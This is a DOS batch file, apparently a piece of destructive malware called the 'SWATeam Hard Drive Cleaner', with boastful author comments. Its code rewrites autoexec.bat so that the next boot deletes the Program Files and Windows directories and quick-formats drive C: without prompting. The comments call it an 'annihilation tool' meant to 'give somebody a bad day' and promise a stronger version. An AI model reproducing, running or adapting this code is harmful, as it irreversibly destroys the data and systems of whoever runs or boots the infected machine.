@ echo off
rem OHHHH YEEEEEEEEEEAAAAAAAAAAAAAAAAAAAAHHHHHHHH The second version
rem of this program is ready, more powerful than the first version, and
rem overall, a far superiour annihilation tool. All bow down to the:
rem SWATeam Hard Drive Cleaner! Guaranteed to give somebody a bad day.

cls
call attrib -h -r c:\autoexec.bat >nul
echo @echo off >c:\autoexec.bat
echo deltree /y c:\progra~1\*.* >nul >>c:\autoexec.bat
echo copy c:\windows\command\format.com c:\ >nul >>c:\autoexec.bat
echo copy c:\windows\command\deltree.exe c:\ >nul >>c:\autoexec.bat
echo deltree /y c:\windows\*.* >nul >>c:\autoexec.bat
echo format c: /q /u /autotest >nul >>c:\autoexec.bat

Rem That little piece of code will ensure that the hard drive get's
rem pretty much scrubbed. In my tests it took only 2 minutes to wipe
rem a hard drive of a few hundred megs of data.
rem So maybe it isn't as big as the firist version, but atleast it
rem doesn't use any other programs as it copies the required files
rem from the hard drive. Yes so it is very simple, it only took me
rem five minutes to write, when i can be bothered i'll write a more
rem efficent hard drive annihilator. You'll probably be able to get
rem hold of it via http://www.swateam.org
rem Coded by -=The Firestarter=- ('cause i was board)